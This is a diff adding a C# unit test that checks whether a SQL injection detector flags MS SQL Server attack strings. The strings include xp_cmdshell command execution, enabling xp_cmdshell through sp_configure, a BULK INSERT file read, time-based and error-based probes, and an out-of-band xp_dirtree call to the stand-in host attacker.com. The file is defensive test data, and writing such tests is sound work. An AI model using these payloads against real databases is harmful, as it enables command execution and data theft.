@@ -559,4 +559,46 @@ public sealed class SqlInjectDetectorTests
             Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(attack), $"Out-of-band attack '{attack}' should be detected");
         }
     }
+
+    [TestMethod]
+    public void ContainsSqlInjection_MsSqlServerSpecific_ReturnsTrue()
+    {
+        // Arrange
+        var msSqlInjections = new[]
+        {
+            // More xp_cmdshell variations
+            "'; EXEC xp_cmdshell 'ping attacker.com'; --",
+            "'; EXEC master.dbo.xp_cmdshell 'net user'; --",
+
+            // sp_configure to enable advanced options
+            "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --",
+            "'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --",
+
+            // BULK INSERT from a file
+            "'; BULK INSERT users FROM 'c:\\temp\\users.txt' WITH (FIELDTERMINATOR = ','); --",
+
+            // More WAITFOR DELAY for time-based attacks
+            "'; IF (SELECT COUNT(*) FROM users) > 10 WAITFOR DELAY '00:00:05'; --",
+
+            // System tables and views
+            "'; SELECT name FROM sysobjects WHERE xtype = 'U'; --",
+            "'; SELECT name FROM master..sysdatabases; --",
+
+            // Stacking queries
+            "'; SELECT * FROM users; SELECT * FROM products; --",
+
+            // Error-based injections
+            "'; SELECT 1/0; --",
+            "'; SELECT CAST(@@version AS int); --",
+
+            // Out-of-band attacks
+            "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'; --",
+        };
+
+        // Act & Assert
+        foreach (var input in msSqlInjections)
+        {
+            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(input), $"MS SQL Server specific injection '{input}' should be detected");
+        }
+    }
 }
